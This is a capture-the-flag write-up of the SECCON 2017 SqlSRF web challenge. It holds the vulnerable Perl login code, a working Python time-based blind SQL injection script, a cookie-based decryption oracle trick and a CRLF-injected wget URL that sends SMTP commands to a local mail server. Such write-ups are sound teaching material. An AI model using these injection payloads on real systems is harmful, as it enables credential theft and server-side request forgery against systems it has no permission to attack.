# SqlSRF

SqlSRF was a 400 point Web challenge in the quals of SECCON 2017. While not exceptionally hard, it required a diverse skillset and was thus quite interesting.

## Challenge description

```
SqlSRF

The root reply the flag to your mail address if you send a mail that subject is "give me flag" to root.
http://sqlsrf.pwn.seccon.jp/sqlsrf/ 
```

## The files

Upon clicking the link provided in the description, we're presented with a list of four files: *bg-header.jpg*, *index.cgi*, *index.cgi_backup20171129*, and *menu.cgi*.

I decided to look into the backup file of *index.cgi* right away. It contains the following code:

```perl
#!/usr/bin/perl

use CGI;
my $q = new CGI;

use CGI::Session;
my $s = CGI::Session->new(undef, $q->cookie('CGISESSID')||undef, {Directory=>'/tmp'});
$s->expire('+1M'); require './.htcrypt.pl';

my $user = $q->param('user');
print $q->header(-charset=>'UTF-8', -cookie=>
  [
    $q->cookie(-name=>'CGISESSID', -value=>$s->id),
    ($q->param('save') eq '1' ? $q->cookie(-name=>'remember', -value=>&encrypt($user), -expires=>'+1M') : undef)
  ]),
  $q->start_html(-lang=>'ja', -encoding=>'UTF-8', -title=>'SECCON 2017', -bgcolor=>'black');
  $user = &decrypt($q->cookie('remember')) if($user eq '' && $q->cookie('remember') ne '');

my $errmsg = '';
if($q->param('login') ne '') {
  use DBI;
  my $dbh = DBI->connect('dbi:SQLite:dbname=./.htDB');
  my $sth = $dbh->prepare("SELECT password FROM users WHERE username='".$q->param('user')."';");
  $errmsg = '<h2 style="color:red">Login Error!</h2>';
  eval {
    $sth->execute();
    if(my @row = $sth->fetchrow_array) {
      if($row[0] ne '' && $q->param('pass') ne '' && $row[0] eq &encrypt($q->param('pass'))) {
        $s->param('autheduser', $q->param('user'));
        print "<scr"."ipt>document.location='./menu.cgi';</script>";
        $errmsg = '';
      }
    }
  };
  if($@) {
    $errmsg = '<h2 style="color:red">Database Error!</h2>';
  }
  $dbh->disconnect();
}
$user = $q->escapeHTML($user);

print <<"EOM";
<!-- The Kusomon by KeigoYAMAZAKI, 2017 -->
<div style="background:#000 url(./bg-header.jpg) 50% 50% no-repeat;position:fixed;width:100%;height:300px;top:0;">
</div>
<div style="position:relative;top:300px;color:white;text-align:center;">
<h1>Login</h1>
<form action="?" method="post">$errmsg
<table border="0" align="center" style="background:white;color:black;padding:50px;border:1px solid darkgray;">
<tr><td>Username:</td><td><input type="text" name="user" value="$user"></td></tr>
<tr><td>Password:</td><td><input type="password" name="pass" value=""></td></tr>
<tr><td colspan="2"><input type="checkbox" name="save" value="1">Remember Me</td></tr>
<tr><td colspan="2" align="right"><input type="submit" name="login" value="Login"></td></tr>
</table>
</form>
</div>
</body>
</html>
EOM

1;
```
## SQL injection

Without thinking too much (and hinted by the title of the challenge), I noticed that this code was vulnerable to a Time-Based SQL injection. I also know that the DBMS used is SQLite. I wrote the following code:

```python
import requests
from time import time

url_prefix = 'http://sqlsrf.pwn.seccon.jp/sqlsrf/index.cgi?login=1&user='
payload_prefix = "admin' and password like '"
payload_suffix = "%' and 1=randomblob(300000000)--"

chars = 'abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ_'
result = ''

while True:
    for char in chars:
        payload = url_prefix + payload_prefix + result + char + payload_suffix
        start = time()
        text = requests.get(payload).text
        end = time()
        if end - start > 2.5:
            result += char
            break
    print result
```

I just assumed that the username would be **admin** (which it was), but the username of the user can be bruteforced in the same way by modifying `payload_prefix` a bit.

I ended up with the following results:
```
username = admin
password = d2f37e101c0e76bcc90b5634a5510f64
```
Since the encrypted password found in the database was 32 characters long, I immediately thought that it could be **MD5**. Unfortunately, after checking several MD5 reversing websites, I was unable to find the original password.

At this point, I supposed that **admin** was not the only user in the database, and that maybe I should get access to *menu.cgi* using another user's credentials.

By modifying the previous script a bit, I managed to find the following credentials in the database:
```
username = user1
password = b8e32e6d23001fad5585258ba815e424f86eb0f42e8d0e9688dfb1293ee5e9ec
```

This encrypted password is clearly not 32 characters long, so I concluded that the `encrypt` function used in *index.cgi* was homemade. Unfortunately, I didn't manage to read the file using my SQL injection, as `readfile` was not available.

## Reversing the passwords

Since I was not able to read the file containing the definition of the `decrypt` function, I quickly realized that there should therefore be a way to call it.

By looking at the code a bit more, I realized that the following code could be exploited:

```perl
my $user = $q->param('user');
print $q->header(-charset=>'UTF-8', -cookie=>
  [
    $q->cookie(-name=>'CGISESSID', -value=>$s->id),
    ($q->param('save') eq '1' ? $q->cookie(-name=>'remember', -value=>&encrypt($user), -expires=>'+1M') : undef)
  ]),
  $q->start_html(-lang=>'ja', -encoding=>'UTF-8', -title=>'SECCON 2017', -bgcolor=>'black');
  $user = &decrypt($q->cookie('remember')) if($user eq '' && $q->cookie('remember') ne '');
```

By replaying a request with the `remember` cookie set and setting it to an encrypted password, it would end up displayed in the *username* field on the page, as the following code shows:

```html
<tr><td>Username:</td><td><input type="text" name="user" value="$user"></td></tr>
```

By doing that with the encrypted admin password `d2f37e101c0e76bcc90b5634a5510f64`, I managed to obtain the plaintext password "**Yes!Kusomon!!**".

Using the credentials **admin**/**Yes!Kusomon!!** then gives us access to *menu.cgi*.

## Command injection

*menu.cgi* is a page that lets us issue two shell commands to the server: `netstat -tnl` and `wget --debug -O /dev/stdout 'http://<user_controlled_input>'`.

After a few checks, it appears that it is not possible to simply issue arbitrary commands from the interface, as no command injection seems to be possible.

## SSRF

Now, the title of the challenge did mention some kind of **S(ql)SRF**. Based on this knowledge, I ran the `netstat -tnl` command and got the following output:
```
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State      
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.1:25            0.0.0.0:*               LISTEN     
tcp6       0      0 :::22                   :::*                    LISTEN     
tcp6       0      0 ::1:25                  :::*                    LISTEN     
```

Hm… A service is running locally on port 25, which is common for **SMTP**. The description of the challenge **did** say that the root would reply with the flag to my mail address if I sent him an email with the subject *give me flag*.

Coincidentally, this also reminded me of this [presentation](https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf) at **BlackHat USA 2017** (*TL;DR `wget` is vulnerable to CRLF injections*).

Armed with this knowledge, it was just a matter of crafting the payload, with every special character url encoded:
```
127.0.0.1 %0D%0AHELO sqlsrf.pwn.seccon.jp%0D%0AMAIL FROM%3A %3CSIben%40mindyourownbusiness.com%3E%0D%0ARCPT TO%3A %3Croot%40localhost%3E%0D%0ADATA%0D%0ASubject%3A give me flag%0D%0Agive me flag%0D%0A.%0D%0AQUIT%0D%0A:25/
```

A few seconds after sending this payload, I received an email with the following content:
```
Encrypted-FLAG: 37208e07f86ba78a7416ecd535fd874a3b98b964005a5503bcaa41a1c9b42a19
```

More encryption? I immediately went back to the *Reversing the passwords* step and put this encrypted string in the cookie.

This outputs the flag: **SECCON{SSRFisMyFriend!}**
